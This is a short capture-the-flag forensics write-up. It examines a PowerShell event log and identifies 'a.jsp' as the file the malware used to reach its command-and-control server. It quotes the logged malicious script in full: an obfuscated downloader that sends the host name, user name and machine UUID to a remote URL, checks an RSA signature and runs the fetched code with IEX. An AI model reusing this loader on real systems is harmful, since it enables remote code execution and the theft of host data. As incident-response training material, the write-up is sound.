# DFIR 4

**Challenge Description:** A lot of malicious PowerShell activities have triggered our EDR. Please investigate the given event log. What is the file name that being was used by the malware as part of the communication with their C2 server?

**Flag Format:** `ihack{filename.ext}`

After going through the log file manually, the constant invocation of script block IEX stood out of the spotlight the most.

```
ScriptBlock ID: 09ee9e58-6311-4724-871d-737c3f8ad7ba
Path: "
Verbose,8/12/2022 5:37:20 PM,Microsoft-Windows-PowerShell,4105,Starting Command,"Started invocation of ScriptBlock ID: 7b57887c-a71f-4f2e-9502-00ea66c5cc18
Runspace ID: 9f39f3e3-de20-4e46-a1f3-5a77082d269f"
Warning,8/12/2022 5:37:20 PM,Microsoft-Windows-PowerShell,4104,Execute a Remote Command,"Creating Scriptblock text (1 of 1):
if(!$v){$v='?rep_'+(Get-Date -Format 'yyyyMMdd')}

$tmps='function a($u){$d=(Ne`w-Obj`ect Net.WebC`lient).""DownloadData""($u);$c=$d.count;if($c -gt 173){$b=$d[173..$c];$p=New-Object Security.Cryptography.RSAParameters;$p.Modulus=[convert]::FromBase64String(''2mWo17uXvG1BXpmdgv8v/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2mT/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv1j1feIY6R7rpfqOLdHa10='');$p.Exponent=0x01,0x00,0x01;$r=New-Object Security.Cryptography.RSACryptoServiceProvider;$r.ImportParameters($p);if($r.verifyData($b,(New-Object Security.Cryptography.SHA1CryptoServiceProvider),[convert]::FromBase64String(-join([char[]]$d[0..171])))){I`ex(-join[char[]]$b)}}}$url=''http://''+''U1''+''U2'';a($url+''/a.jsp'+$v+'?''+(@($env:COMPUTERNAME,$env:USERNAME,(get-wmiobject Win32_ComputerSystemProduct).UUID,(random))-join''*''))'

$sa=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] ""Administrator"")
```

 The PowerShell script is reaching out to a remote address, presumably the C2 server to retrieve a file `a.jsp`.

**Flag:** `ihack{a.jsp}`